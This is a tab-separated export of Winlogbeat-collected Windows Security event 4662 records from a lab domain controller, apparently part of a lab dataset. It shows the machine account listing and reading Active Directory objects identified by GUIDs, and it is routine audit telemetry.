				"	0x20000	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%1538
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110153	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"mBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110152	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"lxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110151	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"lhDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110146	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"lRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110145	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"lBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110144	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"kxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110139	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"khDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110138	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"kRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110137	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"kBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110132	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"jxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110131	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"jhDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{67212414-7bcc-4609-87e0-088dad8abdee}
	Object Name:		%{86fd1a02-26cc-4653-85f6-37709e8229a2}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{67212414-7bcc-4609-87e0-088dad8abdee}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{bf967a70-0de6-11d0-a285-00aa003049e2}
			{d7d5e8c1-e61f-464f-9fcf-20bbe0a2ec54}
			{90b769ac-4413-43cf-ad7a-867142e740a3}
			{86b9a69e-f0a6-405d-99bb-77d977992c2a}
			{250a8f20-f6fc-4559-ae65-e4b24c67aebe}
			{5cf0bcc8-60f7-4bff-bda6-aea0344eb151}
			{9ad33fc9-aacf-4299-bb3e-d1fc6ea88e49}
			{03726ae7-8e7d-4446-8aae-a91657c00993}
			{d6d67084-c720-417d-8647-b696237a114c}
			{1035a8e1-67a8-4c21-b7bb-031cdf99d7a0}
			{51928e94-2cd8-4abe-b552-e50412444370}
			{5ac48021-e447-46e7-9d23-92c0c6a90dfb}
			{db7a08e7-fc76-4569-a45f-f5ecb66a88b5}
			{4c5d607a-ce49-444a-9862-82a95f5d1fcc}
			{2ab0e48d-ac4e-4afc-83e5-a34240db6198}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{86fd1a02-26cc-4653-85f6-37709e8229a2}"	DS	"%{67212414-7bcc-4609-87e0-088dad8abdee}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{67212414-7bcc-4609-87e0-088dad8abdee}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{bf967a70-0de6-11d0-a285-00aa003049e2}
			{d7d5e8c1-e61f-464f-9fcf-20bbe0a2ec54}
			{90b769ac-4413-43cf-ad7a-867142e740a3}
			{86b9a69e-f0a6-405d-99bb-77d977992c2a}
			{250a8f20-f6fc-4559-ae65-e4b24c67aebe}
			{5cf0bcc8-60f7-4bff-bda6-aea0344eb151}
			{9ad33fc9-aacf-4299-bb3e-d1fc6ea88e49}
			{03726ae7-8e7d-4446-8aae-a91657c00993}
			{d6d67084-c720-417d-8647-b696237a114c}
			{1035a8e1-67a8-4c21-b7bb-031cdf99d7a0}
			{51928e94-2cd8-4abe-b552-e50412444370}
			{5ac48021-e447-46e7-9d23-92c0c6a90dfb}
			{db7a08e7-fc76-4569-a45f-f5ecb66a88b5}
			{4c5d607a-ce49-444a-9862-82a95f5d1fcc}
